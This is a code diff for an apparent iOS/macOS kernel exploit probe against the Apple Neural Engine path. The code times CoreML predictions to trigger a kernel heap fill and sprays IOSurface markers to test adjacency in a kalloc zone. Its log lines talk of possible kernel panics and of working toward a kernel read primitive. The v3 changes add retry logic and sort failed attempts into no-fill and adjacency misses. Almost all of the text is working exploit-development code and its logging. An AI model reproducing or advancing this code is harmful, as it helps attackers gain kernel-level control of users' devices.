@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v2-probeopen"
+#define P073_BUILD @"p073-second-table-v3-probeopen"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -59,6 +59,9 @@
 #define P073_ADDCHAIN     @"XVRC27_254in_1out_addchain"
 #define P073_SMALL        @"simple_1in1out"
 #define P073_HEADSTART_US 50000u
+#define P073_254_RETRY    3u     /* v3: bounded fill re-fire attempts (v2's 8ms -1
+                                    looked like NO-FILL, dirty-ANE suspect: p099
+                                    ran 90s before this tap on the same boot) */
 
 /* IOSurface marker spray */
 #define P073_N_SURF       48u
@@ -498,6 +501,8 @@ static NSURL *p073_model_url(NSString *name) {
     }
 
     /* ---- FIRE: small table first (in-flight), then 254 addchain ---- */
+    int pred254Attempts = 0;             /* v3 retry bookkeeping (verdict reads this) */
+    BOOL pred254Fired = NO;
     p073_log(@">>> FIRE: small 1-in/1-out in-flight (table_small pops LIFO top),");
     p073_log(@">>>       254 addchain after %uus headstart (table_254 pops next).", P073_HEADSTART_US);
     p073_log(@">>>       If adjacent: table_254+0xc00 == table_small. PANIC POSSIBLE.");
@@ -525,20 +530,46 @@ static NSURL *p073_model_url(NSString *name) {
         });
         usleep(P073_HEADSTART_US);
 
+        /* v3: fast -1 reject (8ms in v2) is the NO-FILL signature — v42 proved
+           POST-marshal rejects still fill, and an 8ms rejection almost
+           certainly means the request never marshaled (pre-marshal reject /
+           dirty ANE). Bounded re-arm up to P073_254_RETRY, 200ms apart. */
+        id<MLFeatureProvider> pred254 = nil;
         NSError *err254 = nil;
         CFAbsoluteTime t254_0 = CFAbsoluteTimeGetCurrent();
-        id<MLFeatureProvider> pred254 = [model254 predictionFromFeatures:provider error:&err254];
-        CFAbsoluteTime t254_1 = CFAbsoluteTimeGetCurrent();
-        p073_log(@"[*] 254 predict %@ t=%.0fms (kick->ret)",
-                 pred254 ? @"returned" : @"FAILED", (t254_1 - t254_0) * 1000.0);
+        for (uint32_t attempt = 1; attempt <= P073_254_RETRY; attempt++) {
+            err254 = nil;
+            t254_0 = CFAbsoluteTimeGetCurrent();
+            pred254 = [model254 predictionFromFeatures:provider error:&err254];
+            CFAbsoluteTime t254_1 = CFAbsoluteTimeGetCurrent();
+            double ms = (t254_1 - t254_0) * 1000.0;
+            pred254Attempts = attempt;
+            p073_log(@"[*] 254 predict try %u/%u %@ t=%.0fms (kick->ret)",
+                     attempt, P073_254_RETRY, pred254 ? @"returned" : @"FAILED", ms);
+            if (pred254) {
+                pred254Fired = YES;
+                break;
+            }
+            if (ms >= 15.0) {
+                /* post-marshal window reached — v42: error -1 still filled.
+                   Re-arming here could double-fire; stop. */
+                pred254Fired = YES;
+                p073_log(@"[FIRE] 254 marshal window open (slow reject = post-marshal) — stop re-arming");
+                break;
+            }
+            if (attempt < P073_254_RETRY) usleep(200000);
+        }
         if (pred254) {
             MLFeatureValue *y = [pred254 featureValueForName:@"y"];
             MLMultiArray *ya = y.multiArrayValue;
             p073_log(@"[*] 254 y[0]=%@ (addchain: prediction OK is UNEXPECTED — check model)",
                      ya ? ya[0] : @"<no y>");
         } else {
-            p073_log(@"[*] 254 error: %@ %ld — fill may STILL have fired (v42: error -1 still filled)",
-                     err254.domain ?: @"-", (long)err254.code);
+            p073_log(@"[*] 254 error: %@ %ld after %d tries — %@",
+                     err254.domain ?: @"-", (long)err254.code, pred254Attempts,
+                     pred254Fired
+                       ? @"fill LIKELY FIRED (post-marshal reject, v42 class)"
+                       : @"fill DID NOT FIRE (pre-marshal rejects — dirty ANE or model state)");
         }
 
         long waitRes = dispatch_semaphore_wait(smallDone, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
@@ -583,12 +614,27 @@ static NSURL *p073_model_url(NSString *name) {
         [[P007Board shared] recordEvent:@"p073_session" kind:@"occupancy"
                                  detail:@"sentinel FILL HIT, no consume" source:@"p073"];
     } else {
-        p073_log(@"MISS — no surface touch, no sentinel hit. Either adjacency missed into an");
-        p073_log(@"unknown neighbor (check for IPS panic: CheckandPrewire+0x18c GZAlloc page-end,");
-        p073_log(@"or [data.kalloc.3072] MAF in another process) or the fill did not fire.");
-        [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
-                                 detail:@"no touch no hit" source:@"p073"];
+        /* v3: disambiguate MISS — no-fill is NOT an adjacency result. */
+        if (!pred254Fired) {
+            p073_log(@"MISS (NO-FILL): 254 never marshaled (all %d rejects fast).",
+                     pred254Attempts);
+            p073_log(@"NOT an adjacency result. Reboot (note209 dirty-boot rule) and retap on");
+            p073_log(@"a fresh boot with this tap FIRST, before p099 — ANE state was dirty.");
+            [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
+                                     detail:@"no-fill (pre-marshal rejects)" source:@"p073"];
+        } else {
+            p073_log(@"MISS (ADJACENCY): fill marshaled — no surface touch, no sentinel hit, so");
+            p073_log(@"the neighbor was unknown or empty. Check for a later IPS panic anyway");
+            p073_log(@"(CheckandPrewire+0x18c GZAlloc page-end, or [data.kalloc.3072] MAF).");
+            [[P007Board shared] recordEvent:@"p073_session" kind:@"miss"
+                                     detail:@"adjacency-miss (fill fired)" source:@"p073"];
+        }
     }
+    p073_log(@"[VERDICT] kind=%s first_fail_stage=%s fires=%d ok=%d",
+             touched > 0 ? "conversion" : (mut > 0 ? "occupancy" : "miss"),
+             touched > 0 ? "none"
+               : (mut > 0 ? "adjacency" : (!pred254Fired ? "a-fill" : "b-adjacency")),
+             (int)pred254Attempts, touched > 0 ? 1 : 0);
     p073_log(@"hasKread=NO. kread32 registers only from a copyout of kernel bytes we did not write.");
     p073_log(@"One TAP per force-quit. Reboot if ANE/kmsg state is dirty.");
 
